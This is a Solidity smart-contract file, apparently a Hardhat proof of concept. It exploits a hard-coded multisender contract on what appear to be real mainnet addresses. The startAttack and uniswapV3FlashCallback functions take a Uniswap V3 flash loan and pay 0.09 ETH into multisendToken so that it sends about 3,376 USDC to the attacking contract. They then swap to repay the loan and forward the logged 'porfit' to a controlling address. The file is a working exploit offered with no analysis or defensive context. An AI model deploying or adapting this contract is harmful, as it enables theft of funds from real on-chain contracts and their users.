pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint);

    function balanceOf(address owner) external view returns (uint);

    function allowance(address owner, address spender)
        external
        view
        returns (uint);

    function approve(address spender, uint value) external returns (bool);

    function transfer(address to, uint value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint);

    function permit(
        address owner,
        address spender,
        uint value,
        uint deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(
        address indexed sender,
        uint amount0,
        uint amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );

    function price0CumulativeLast() external view returns (uint);

    function price1CumulativeLast() external view returns (uint);

    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);

    function burn(address to) external returns (uint amount0, uint amount1);

    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

interface IMultisender {
    struct Recip {
        address recipients;
        uint256 _balances;
    }

    function multisendToken(
        address _token,
        Recip[] memory recipients,
        uint256 _total,
        address _referral
    ) external payable;
}

library SafeMath {
    function add(uint x, uint y) internal pure returns (uint z) {
        require((z = x + y) >= x, "ds-math-add-overflow");
    }

    function sub(uint x, uint y) internal pure returns (uint z) {
        require((z = x - y) <= x, "sub-underflow");
    }

    function mul(uint x, uint y) internal pure returns (uint z) {
        require(y == 0 || (z = x * y) / y == x, "ds-math-mul-overflow");
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "Undivision by zero");
        uint256 c = a / b;
        return c;
    }
}

interface IWETH {
    function deposit() external payable;

    function transfer(address to, uint256 value) external returns (bool);

    function withdraw(uint256) external;

    function approve(address guy, uint256 wad) external returns (bool);

    function balanceOf(address owner) external view returns (uint256);
}

interface IUniswapV3FlashCallback {
    function flash(
        address recipient,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;
}

contract utils {
    using SafeMath for uint256;

    function approveUSDC() external {
        IUniswapV2Pair(address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48))
            .approve(address(0xA5025FABA6E70B84F74e9b1113e5F7F4E7f4859f), 1000);
        console.log(
            "approveUSDC:",
            "0xA5025FABA6E70B84F74e9b1113e5F7F4E7f4859f"
        );
    }

    receive() external payable {}

    function startAttack() public {
        require(
            msg.sender == address(0xB790a054780b274199EBA1e704C4bBEfe7eA8Bfe)
        );
        IUniswapV3FlashCallback(
            address(0x8ad599c3A0ff1De082011EFDDc58f1908eb6e6D8)
        ).flash(address(this), 0, 0.09 ether, "0xcallflash");
    }

    function uniswapV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external {
        IWETH(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)).withdraw(
            0.09 ether
        );
        multisend();

        (uint256 reserveIn, uint256 reserveOut, ) = IUniswapV2Pair(
            address(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc)
        ).getReserves();

        uint256 amountIn = getAmountIn(
            fee1.add(0.09 ether).add(10),
            reserveIn,
            reserveOut
        );

        IUniswapV2Pair(address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48))
            .transfer(
                address(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc),
                amountIn
            );

        IUniswapV2Pair(address(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc))
            .swap(0, fee1.add(0.09 ether), address(this), "");

        IWETH(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)).transfer(
            address(0x8ad599c3A0ff1De082011EFDDc58f1908eb6e6D8),
            fee1.add(0.09 ether)
        );
        uint256 porfit = IUniswapV2Pair(
            address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48)
        ).balanceOf(address(this));
        console.log("porfit '%s'", porfit);

        IUniswapV2Pair(address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48))
            .transfer(
                address(0xB790a054780b274199EBA1e704C4bBEfe7eA8Bfe),
                porfit
            );
    }

    function multisend() internal {
        IMultisender.Recip[] memory recipients = new IMultisender.Recip[](1);
        recipients[0] = IMultisender.Recip({
            recipients: address(this),
            _balances: 3376250465
        });
        IMultisender(address(0xA5025FABA6E70B84F74e9b1113e5F7F4E7f4859f))
            .multisendToken{value: 0.09 ether}(
            address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48),
            recipients,
            100,
            address(0)
        );
    }

    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) internal pure returns (uint256 amountIn) {
        require(amountOut > 0, "UniswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT");
        require(
            reserveIn > 0 && reserveOut > 0,
            "UniswapV2Library: INSUFFICIENT_LIQUIDITY"
        );
        uint256 numerator = reserveIn.mul(amountOut).mul(1000);
        uint256 denominator = reserveOut.sub(amountOut).mul(997);
        amountIn = (numerator / denominator).add(1);
    }

    function getbalance(address usder) external returns (uint256) {
        uint256 balance = IUniswapV2Pair(
            address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48)
        ).balanceOf(usder);
        console.log("balance:", balance);
        return balance;
    }

    function transfer(address to, uint value) external returns (bool) {}
}
